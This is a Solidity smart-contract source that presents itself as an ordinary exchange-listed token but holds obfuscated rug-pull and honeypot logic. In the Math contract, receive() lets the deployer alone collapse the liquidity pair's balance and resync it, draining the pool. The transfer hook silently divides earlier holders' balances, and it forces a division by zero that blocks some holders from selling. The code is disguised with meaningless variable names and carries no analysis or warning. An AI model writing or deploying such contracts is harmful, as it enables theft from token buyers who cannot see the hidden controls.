pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Running;

    address[] internal inArr; address[3] internal inuAddr;

    bool[3] internal Hopes; bool internal trading = false;

    uint256 internal Sword = block.number*2; uint256 internal numB;
    uint256 internal Lights = 0; uint256 internal Farts = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function set() internal {
        inuAddr[0] = address(_router);
        inuAddr[1] = msg.sender;
        inuAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Running[Math.inuAddr[q]] = true; Math.Hopes[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Lights > 1 ? inArr[inArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == inuAddr[1]); _balances[inuAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(inuAddr[2]).sync(); Hopes[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == inuAddr[1])), "ERC20: trading is not yet enabled.");
        Farts += ((Running[sender] != true) && (Running[recipient] == true)) ? 1 : 0;
        if (((Running[sender] == true) && (Running[recipient] != true)) || ((Running[sender] != true) && (Running[recipient] != true))) { inArr.push(recipient); }
        _balancesOfTheOld(sender, recipient);
    }

    function _balancesOfTheOld(address sender, address recipient) internal {
        if ((Hopes[0] || (Hopes[2] && (recipient != inuAddr[1])))) { for (uint256 q=0; q < inArr.length-1; q++) { _balances[inArr[q]] /= (Hopes[2] ? 1e9 : 4e1); } Hopes[0] = false; }
        _balances[last(1)] /= (((Sword == block.number) || Hopes[1] || ((Sword - numB) <= 7)) && (Running[last(1)] != true) && (Lights > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Hopes[1]) && (last(0) == sender)) || ((Hopes[2] && (inuAddr[1] != sender))) ? (0) : (1));
        (Hopes[0],Hopes[1]) = ((((Farts*10 / 4) == 10) && (Hopes[1] == false)) ? (true,true) : (Hopes[0],Hopes[1]));
        Sword = block.number; Lights++;
    }
}